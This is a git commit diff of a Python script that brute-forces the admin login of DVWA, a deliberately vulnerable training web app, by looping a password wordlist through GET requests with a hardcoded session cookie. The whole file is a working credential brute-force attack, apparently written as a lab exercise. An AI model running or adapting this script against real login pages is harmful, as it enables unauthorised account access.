d7331d0453f5746fc883a5290d8f0b89d61b254b
Михаил <125532132+mikhailcrocodil@users.noreply.github.com>
2023-12-14 19:24:30 +0300

    Update tsk1.py

--- tsk1.py
+++ tsk1.py
@@ -1,34 +1,34 @@
 import requests
 import time
 
-dict_file = '/home/dojo/Desktop/rockyou.txt'
+dict_file = '/home/dojo/Desktop/passwords.txt'
 u_name_list = ['admin']
-headers = {'Cookie':'security=low; PHPSESSID=raierlhcspe66pksiebmcc26gf','Referer':'http://localhost/DVWA/index.php'}
 
 def get_http(u_name, p_word):
-    url = "http://localhost/dvwa/vulnerabilities/brute/"
-    params = {'username': u_name, 'password': p_word, 'Login': 'Login'}
-    req = requests.get(url, headers=headers, params=params)
-    return url, req.status_code, req.text
+    head = {'username': 'admin', 'password': p_word, 'Login': 'Login'}
+    cookie = {'security': 'low', 'PHPSESSID': 'd6irod0dk38ah8pqdvh6bglfeu'}
+    req = requests.get(f'http://dvwa.local/vulnerabilities/brute/?username=admin&password={p_word}&Login=Login#', data=head, cookies=cookie)
+    return req.text
 
-print('Starting bruteforce')
-total_lines = sum(1 for line in open(dict_file))
-lines_analyzed = 0
+if __name__=="__main__":
+    total_lines = sum(1 for line in open(dict_file))
+    lines_analyzed = 0
 
-start_time = time.time()
-for u_name in u_name_list:
-    f = open(dict_file, 'r')
-    for line in f:
-        p_word = line.strip()
-        url, status_code, result = get_http(u_name, p_word)
-        if result.find('incorrect') == -1:
-            print('Login: ' + u_name + ', password: ' + p_word)
-        lines_analyzed += 1
+    start_time = time.time()
+    for u_name in u_name_list:
+        f = open(dict_file, 'r')
+        for line in f:
+            p_word = line.strip()
+            result = get_http(u_name, p_word)
+            if 'Username and/or password incorrect.' not in result:
+                print('Password found: ' + p_word)
+                break
 
-        elapsed_time = time.time() - start_time
-        if elapsed_time >= 30:
-            percentage_analyzed = (lines_analyzed / total_lines) * 100
-            print(f'{percentage_analyzed:.2f}% of the file analyzed')
-            start_time = time.time()
+            lines_analyzed += 1
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= 30:
+                percentage_analyzed = (lines_analyzed / total_lines) * 100
+                print(f'{percentage_analyzed:.2f}% of the file analyzed')
+                start_time = time.time()
 
-    f.close()
+        f.close()
